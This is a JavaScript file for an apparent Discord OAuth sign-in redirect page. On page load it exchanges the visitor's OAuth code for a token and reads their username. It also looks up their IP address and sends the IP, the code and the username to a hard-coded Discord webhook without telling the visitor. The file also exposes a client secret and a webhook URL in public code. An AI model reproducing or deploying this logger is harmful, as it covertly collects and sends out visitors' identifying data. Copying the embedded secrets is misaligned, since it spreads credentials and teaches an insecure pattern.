document.addEventListener('DOMContentLoaded', () => {
    const webhookUrl = 'https://discord.com/api/webhooks/1285089226743873659/dULAcB9U-d3AfF0lFYO1tmZ_m9LQVwJIzSmZ6irwtgQVkl7lhoJ8fYxv6eWn2oAeh4jq';
    const clientId = 'Y1285078591864045630'; // DiscordのクライアントID
    const clientSecret = 'yRmhBCgeyqi23yaRjwikIcJ6US9yQkgU'; // Discordのクライアントシークレット
    const redirectUri = 'https://capped-uwu.github.io/drakoiefiejigtr'; // Discord開発者ポータルで設定したリダイレクトURI

    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    async function getAccessToken(code) {
        const params = new URLSearchParams({
            client_id: clientId,
            client_secret: clientSecret,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri, // URLエンコードは不要
            scope: 'identify'
        });

        try {
            const response = await fetch('https://discord.com/api/oauth2/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: params
            });

            if (!response.ok) {
                const errorData = await response.json();
                console.error('Error response from server:', errorData);
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            return data.access_token;
        } catch (error) {
            console.error('Error getting access token:', error);
            return null;
        }
    }

    async function getUserInfo(accessToken) {
        try {
            const response = await fetch('https://discord.com/api/v10/users/@me', {
                headers: {
                    'Authorization': `Bearer ${accessToken}`
                }
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.json();
            return data.username;
        } catch (error) {
            console.error('Error getting user info:', error);
            return 'Unknown';
        }
    }

    async function sendDataToDiscord(username, code, ip) {
        const embed = {
            embeds: [
                {
                    title: 'User Information',
                    fields: [
                        { name: 'IP Address', value: ip || 'Not available' },
                        { name: 'Code', value: code || 'Not available' },
                        { name: 'Username', value: username || 'Not available' }
                    ]
                }
            ]
        };

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embed)
            });
            console.log('Data sent to Discord!');
        } catch (error) {
            console.error('Error sending data to Discord:', error);
        }
    }

    async function processOAuth() {
        const code = getQueryParam('code');
        if (!code) {
            console.error('No code found in URL');
            return;
        }

        const accessToken = await getAccessToken(code);
        if (accessToken) {
            const username = await getUserInfo(accessToken);
            const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip).catch(() => 'unknown');
            await sendDataToDiscord(username, code, ip);
        } else {
            console.error('Access token not obtained');
        }
    }

    processOAuth();
});
